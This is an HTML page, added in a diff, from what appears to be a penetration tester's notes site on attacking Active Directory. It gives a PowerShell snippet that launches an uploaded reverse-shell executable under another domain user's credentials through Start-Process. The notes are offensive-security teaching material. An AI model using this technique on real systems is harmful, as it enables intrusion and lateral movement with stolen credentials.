@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="xapax">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Running Program as User Without GUI Interaction - Notes</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Powershell - Start process as another user without GUI interactions", url: "#_top", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../amsi_bypass/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../amsi_bypass/" class="btn btn-xs btn-link">
+        AMSI Bypass
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../networking/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../networking/" class="btn btn-xs btn-link">
+        Networking
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="powershell-start-process-as-another-user-without-gui-interactions">Powershell - Start process as another user without GUI interactions<a class="headerlink" href="#powershell-start-process-as-another-user-without-gui-interactions" title="Permanent link">#</a></h2>
+<p>I have not been able to use "runas" command, as it requires some extra input (GUI-connected?)
+As certain users cannot use psexec (requires local admin access), it's simpler to upload a
+reverse shell and use "start-process" with the other user's credentials.</p>
+<pre><code class="powershell">$program = &quot;C:\Share\rev_shell.exe&quot;
+$usr_plain = &quot;domain1\adm_user&quot;
+$pwd_plain = &quot;P@ssword&quot;
+$pwd_obj = ConvertTo-SecureString $pwd_plain -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential($usr_plain, $pwd_obj)
+Start-Process $program -Credential $creds
+</code></pre>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../amsi_bypass/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../amsi_bypass/" class="btn btn-xs btn-link">
+        AMSI Bypass
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../networking/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../networking/" class="btn btn-xs btn-link">
+        Networking
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+      <p>
+        <a href="https://github.com/xapax/edit/master/docs/attacking_active_directory_domain/powershell/running_program_as_user_without_guiinteraction.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
